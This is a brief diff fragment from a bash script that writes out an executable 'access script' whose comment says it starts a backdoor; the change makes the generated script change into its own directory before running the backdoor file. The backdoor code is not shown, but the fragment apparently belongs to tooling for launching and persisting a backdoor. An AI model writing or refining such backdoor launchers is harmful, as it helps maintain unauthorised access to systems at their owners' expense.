@@ -46,7 +46,7 @@ sleep 1
   echo "#!/bin/bash"
   echo ""
   echo "# Start the backdoor script"
-  echo "./$BACKDOOR_FILE"
+  echo "cd \"\$(dirname \"\$0\")\" && ./$BACKDOOR_FILE"
 } > "$OUTPUT_FILE"
 
 # Make the access script file executable
